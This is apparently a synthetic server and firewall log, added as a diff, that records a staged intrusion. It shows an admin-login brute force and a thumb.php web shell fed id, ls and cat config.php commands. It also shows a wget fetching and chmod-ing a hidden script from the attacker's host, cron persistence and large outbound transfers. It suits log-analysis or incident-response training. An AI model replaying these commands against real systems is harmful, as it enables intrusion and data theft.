@@ -1,0 +1,184 @@
+2026-04-02T00:00:01Z web-srv01 CRON[728]: (root) CMD (/usr/local/bin/rotate-logs.sh)
+2026-04-02T00:05:00Z web-srv01 nginx[571]: 192.0.2.150 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:06:15Z web-srv01 nginx[701]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:08:03Z web-srv01 nginx[866]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:09:12Z web-srv01 nginx[714]: 192.0.2.150 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:10:01Z web-srv01 nginx[872]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:11:43Z web-srv01 nginx[607]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:13:09Z web-srv01 nginx[491]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:14:35Z web-srv01 nginx[698]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:15:33Z web-srv01 nginx[723]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:16:23Z web-srv01 nginx[436]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:17:51Z web-srv01 nginx[873]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:19:26Z web-srv01 nginx[482]: 192.0.2.40 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:20:17Z web-srv01 nginx[653]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:21:14Z web-srv01 nginx[580]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:21:58Z web-srv01 nginx[433]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:23:43Z web-srv01 nginx[869]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:25:18Z web-srv01 nginx[865]: 192.0.2.40 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:26:58Z web-srv01 nginx[445]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:27:42Z web-srv01 nginx[575]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:29:04Z web-srv01 nginx[859]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:30:01Z web-srv01 CRON[688]: (www-data) CMD (php /var/www/html/artisan schedule:run)
+2026-04-02T00:30:30Z web-srv01 nginx[475]: 192.0.2.40 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:31:13Z web-srv01 nginx[743]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:32:11Z web-srv01 nginx[575]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:33:56Z web-srv01 nginx[605]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:35:07Z web-srv01 nginx[688]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:36:05Z web-srv01 nginx[515]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:37:02Z web-srv01 nginx[884]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:38:49Z web-srv01 nginx[872]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:40:20Z web-srv01 nginx[566]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:42:04Z web-srv01 nginx[464]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:43:15Z web-srv01 nginx[581]: 192.0.2.150 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:44:57Z web-srv01 nginx[493]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T00:45:56Z web-srv01 nginx[861]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:46:48Z web-srv01 nginx[811]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:47:54Z web-srv01 nginx[469]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:49:15Z web-srv01 nginx[768]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:50:57Z web-srv01 nginx[859]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T00:52:18Z web-srv01 nginx[487]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:54:00Z web-srv01 nginx[813]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:55:11Z web-srv01 nginx[874]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:56:07Z web-srv01 nginx[892]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:57:29Z web-srv01 nginx[703]: 192.0.2.150 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T00:58:17Z web-srv01 nginx[622]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T00:59:41Z web-srv01 nginx[580]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:00:01Z web-srv01 CRON[793]: (root) CMD (/usr/local/bin/rotate-logs.sh)
+2026-04-02T01:00:43Z web-srv01 nginx[400]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:02:26Z web-srv01 nginx[791]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:03:49Z web-srv01 nginx[718]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:05:06Z web-srv01 nginx[516]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:05:12Z web-srv01 nginx[673]: 10.20.0.5 "POST /admin/login HTTP/1.1" 302 auth=SUCCESS user=admin
+2026-04-02T01:06:11Z web-srv01 nginx[697]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:07:31Z web-srv01 nginx[674]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:08:19Z web-srv01 nginx[717]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:09:07Z web-srv01 nginx[650]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:10:46Z web-srv01 nginx[440]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:12:07Z web-srv01 nginx[745]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:13:46Z web-srv01 nginx[607]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:14:27Z web-srv01 nginx[400]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:15:43Z web-srv01 nginx[757]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:16:51Z web-srv01 nginx[639]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:18:06Z web-srv01 nginx[875]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:18:55Z web-srv01 nginx[544]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:20:04Z web-srv01 nginx[531]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:20:45Z web-srv01 nginx[658]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:21:43Z web-srv01 nginx[676]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:22:28Z web-srv01 nginx[774]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:23:59Z web-srv01 nginx[674]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:24:51Z web-srv01 nginx[649]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:26:19Z web-srv01 nginx[866]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:27:57Z web-srv01 nginx[608]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:29:46Z web-srv01 nginx[506]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:30:01Z web-srv01 CRON[408]: (www-data) CMD (php /var/www/html/artisan schedule:run)
+2026-04-02T01:31:10Z web-srv01 nginx[548]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:31:50Z web-srv01 nginx[738]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:32:31Z web-srv01 nginx[718]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:33:29Z web-srv01 nginx[564]: 192.0.2.40 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:34:18Z web-srv01 nginx[579]: 192.0.2.40 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:35:40Z web-srv01 nginx[458]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:37:00Z web-srv01 nginx[595]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:38:21Z web-srv01 nginx[463]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T01:39:20Z web-srv01 nginx[734]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:40:44Z web-srv01 sshd[833]: Accepted publickey for deploy from 10.20.0.5 port 57822 ssh2
+2026-04-02T01:41:08Z web-srv01 nginx[770]: 192.0.2.40 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:41:49Z web-srv01 nginx[871]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:42:57Z web-srv01 nginx[527]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:44:21Z web-srv01 nginx[493]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:45:21Z web-srv01 nginx[871]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:46:29Z web-srv01 nginx[596]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:47:03Z fw01 ufw[658]: ALLOW OUT SRC=10.20.0.15 DST=192.0.2.200 PROTO=TCP SPT=59445 DPT=443 LEN=590
+2026-04-02T01:47:27Z web-srv01 nginx[757]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:48:17Z web-srv01 nginx[852]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:49:17Z web-srv01 nginx[447]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:51:00Z web-srv01 nginx[755]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:51:46Z web-srv01 nginx[631]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:52:09Z web-srv01 sshd[618]: Failed password for root from 192.0.2.201 port 37189 ssh2
+2026-04-02T01:53:23Z web-srv01 nginx[836]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:54:48Z web-srv01 nginx[680]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T01:56:22Z web-srv01 nginx[547]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T01:57:47Z web-srv01 nginx[518]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:58:37Z web-srv01 nginx[800]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T01:59:51Z web-srv01 nginx[608]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:00:01Z web-srv01 CRON[523]: (root) CMD (/usr/local/bin/rotate-logs.sh)
+2026-04-02T02:01:37Z web-srv01 nginx[642]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:02:43Z web-srv01 nginx[621]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:03:53Z web-srv01 nginx[832]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:05:28Z web-srv01 nginx[704]: 192.0.2.40 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:06:34Z web-srv01 nginx[900]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:07:34Z web-srv01 nginx[536]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:08:15Z web-srv01 nginx[535]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:09:55Z web-srv01 nginx[770]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:09:57Z web-srv01 nginx[427]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:09:59Z web-srv01 nginx[826]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:10:02Z web-srv01 nginx[442]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:05Z web-srv01 nginx[517]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:09Z web-srv01 nginx[498]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:11Z web-srv01 nginx[887]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:13Z web-srv01 nginx[871]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:16Z web-srv01 nginx[516]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:21Z web-srv01 nginx[748]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:23Z web-srv01 nginx[587]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:27Z web-srv01 nginx[685]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:32Z web-srv01 nginx[657]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:36Z web-srv01 nginx[776]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:39Z web-srv01 nginx[402]: 203.0.113.166 "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin
+2026-04-02T02:10:47Z web-srv01 nginx[468]: 203.0.113.166 "POST /admin/login HTTP/1.1" 302 auth=SUCCESS user=admin
+2026-04-02T02:11:33Z web-srv01 nginx[766]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:12:15Z web-srv01 nginx[891]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:12:21Z web-srv01 nginx[898]: 203.0.113.166 "POST /admin/upload HTTP/1.1" 200 auth=SUCCESS user=admin file=thumb.php
+2026-04-02T02:12:58Z web-srv01 nginx[637]: 203.0.113.166 "GET /media/thumb.php HTTP/1.1" 200 auth=NONE
+2026-04-02T02:13:19Z web-srv01 nginx[417]: 203.0.113.166 "GET /media/thumb.php?c=id HTTP/1.1" 200 auth=NONE
+2026-04-02T02:13:40Z web-srv01 nginx[620]: 203.0.113.166 "GET /media/thumb.php?c=ls+/var/www/html HTTP/1.1" 200 auth=NONE
+2026-04-02T02:13:46Z web-srv01 nginx[412]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:14:01Z web-srv01 nginx[525]: 203.0.113.166 "GET /media/thumb.php?c=cat+/var/www/html/config.php HTTP/1.1" 200 auth=NONE
+2026-04-02T02:14:01Z web-srv01 auditd[764]: type=OPEN uid=33(www-data) exe=/usr/bin/php file=/var/www/html/config.php
+2026-04-02T02:14:40Z web-srv01 nginx[647]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:16:03Z web-srv01 nginx[466]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:17:40Z web-srv01 nginx[558]: 192.0.2.14 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:18:59Z web-srv01 nginx[626]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:20:04Z web-srv01 nginx[664]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:21:48Z web-srv01 nginx[641]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:22:15Z web-srv01 sshd[549]: Accepted password for dbadmin from 203.0.113.166 port 49822 ssh2
+2026-04-02T02:22:16Z web-srv01 sshd[833]: pam_unix(sshd:session): session opened for user dbadmin(uid=1004) by (uid=0)
+2026-04-02T02:22:51Z web-srv01 nginx[867]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:23:07Z web-srv01 bash[413]: dbadmin: wget -q http://203.0.113.166:8000/sync.sh -O /tmp/.sync.sh && chmod +x /tmp/.sync.sh
+2026-04-02T02:23:26Z web-srv01 crontab[408]: (dbadmin) BEGIN EDIT (dbadmin)
+2026-04-02T02:23:38Z web-srv01 nginx[569]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:23:39Z web-srv01 crontab[804]: (dbadmin) REPLACE (dbadmin)
+2026-04-02T02:25:07Z web-srv01 nginx[690]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:25:51Z web-srv01 nginx[701]: 192.0.2.93 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:27:34Z web-srv01 nginx[853]: 192.0.2.150 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:29:07Z web-srv01 nginx[592]: 192.0.2.14 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:29:47Z web-srv01 nginx[723]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:30:01Z web-srv01 CRON[795]: (www-data) CMD (php /var/www/html/artisan schedule:run)
+2026-04-02T02:30:01Z web-srv01 CRON[801]: (dbadmin) CMD (/tmp/.sync.sh)
+2026-04-02T02:30:12Z fw01 ufw[579]: ALLOW OUT SRC=10.20.0.15 DST=203.0.113.166 PROTO=TCP SPT=51840 DPT=8443 LEN=80592251
+2026-04-02T02:31:35Z web-srv01 nginx[491]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:33:21Z web-srv01 nginx[522]: 192.0.2.14 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:34:33Z web-srv01 nginx[631]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:35:17Z web-srv01 nginx[534]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:36:32Z web-srv01 nginx[655]: 192.0.2.40 "GET / HTTP/1.1" 200 auth=NONE
+2026-04-02T02:38:17Z web-srv01 nginx[576]: 192.0.2.93 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:39:16Z web-srv01 nginx[769]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:40:01Z web-srv01 CRON[773]: (dbadmin) CMD (/tmp/.sync.sh)
+2026-04-02T02:40:12Z fw01 ufw[817]: ALLOW OUT SRC=10.20.0.15 DST=203.0.113.166 PROTO=TCP SPT=47300 DPT=8443 LEN=57358166
+2026-04-02T02:41:04Z web-srv01 nginx[598]: 192.0.2.40 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:41:50Z web-srv01 nginx[782]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:42:41Z web-srv01 nginx[599]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:43:26Z web-srv01 nginx[825]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:44:45Z web-srv01 nginx[447]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:46:19Z web-srv01 nginx[824]: 192.0.2.14 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:47:53Z web-srv01 nginx[661]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:49:19Z web-srv01 nginx[717]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:50:01Z web-srv01 CRON[626]: (dbadmin) CMD (/tmp/.sync.sh)
+2026-04-02T02:50:12Z fw01 ufw[711]: ALLOW OUT SRC=10.20.0.15 DST=203.0.113.166 PROTO=TCP SPT=47119 DPT=8443 LEN=57028767
+2026-04-02T02:51:07Z web-srv01 nginx[878]: 192.0.2.40 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:52:44Z web-srv01 nginx[707]: 192.0.2.150 "GET /produits HTTP/1.1" 200 auth=NONE
+2026-04-02T02:54:24Z web-srv01 nginx[423]: 192.0.2.150 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:55:13Z web-srv01 nginx[874]: 192.0.2.93 "GET /contact HTTP/1.1" 200 auth=NONE
+2026-04-02T02:56:56Z web-srv01 nginx[787]: 192.0.2.150 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T02:58:29Z web-srv01 nginx[498]: 192.0.2.93 "GET /static/app.css HTTP/1.1" 200 auth=NONE
+2026-04-02T03:00:01Z web-srv01 CRON[442]: (dbadmin) CMD (/tmp/.sync.sh)
+2026-04-02T03:00:12Z fw01 ufw[405]: ALLOW OUT SRC=10.20.0.15 DST=203.0.113.166 PROTO=TCP SPT=50768 DPT=8443 LEN=42406524
